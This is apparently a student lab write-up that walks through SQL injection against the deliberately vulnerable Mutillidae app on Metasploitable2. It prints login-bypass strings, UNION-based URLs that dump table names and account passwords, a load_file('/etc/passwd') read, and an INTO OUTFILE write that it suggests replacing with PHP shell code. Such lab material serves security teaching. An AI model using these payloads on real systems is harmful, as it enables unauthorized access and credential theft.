 # sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/f5fad794-e4c1-4ceb-8aa4-302769737fad)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/96781ece-55af-4e0a-b6e1-7df5dfa57c1d)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/6ebf9352-e232-47b3-8b73-c24eb3fc6568)

Click on the menu Login/Register and register for an account 
![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/e8658974-805d-4c76-9223-08738f3c0726)

Click on the link “Please register here”
![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/0775ec30-c00e-4dd1-9123-13f1ad62e66c)

Click on “Create Account” to display the following page
![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/99d1d87a-8309-4fec-896f-4d48810a7b49)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/e19e60dc-ee30-4b0e-b8ed-15ae2bcf5ab1)

Click “Login”. The logged in page will show as below:
![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/10ccb0ae-3fc9-4751-8d7f-7841a0597d00)

Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/6cc10281-b5ce-47c4-a974-711a7e71643e)


Click the login button and you will see it enter into the administrator page.

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/2d035d61-bb06-4194-909a-ce5271fef13d)

## Union-based SQL injection:
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/69bb027d-59bb-4279-ab3f-5776a0090296)


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/495a43c8-7d95-4e6b-ab14-ac962868e259)


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/2cf1eb1f-ebc7-4d39-a035-a9144881c131)



![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/c6eb4e38-a878-45d6-8bc0-82200864375b)



![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/f7802bb6-c307-4ded-a95d-81819b075cdc)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. 


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/319e5812-a9e3-45e7-ace9-7dbef872067a)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6. The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/442fab07-e54f-4922-8b39-9bd550067445)
After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/75fe610e-ccf5-4bf3-9ac6-2d5e35ebf365)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/c70a6db9-f2ff-4127-8851-635cfdacc970)

As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/e0644966-848b-48a6-adc3-887027f5ec79)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/512c940c-da67-41e7-92d9-83401c05027c)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/16bece46-07be-407c-85ae-60dd853f552a)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database. http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details 


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/9e2c7d31-c57d-491c-95a0-617a2bff83d5)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/5adfb3c8-c6d4-4d3d-acc4-c570314659e3)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/25de536f-a685-4ce8-a853-6cc797ba68cd)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/b2f6228e-f152-4c44-a33d-50bd64cdc400)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/f61c7d19-dc2d-44c5-a5b8-ebcd26bdce7b)

## Reading and writing files on the web-server:
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/skiruthika648/sqlinjection/assets/128348968/a0170dd0-c3ee-43d7-bde0-13f6bda8e478)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
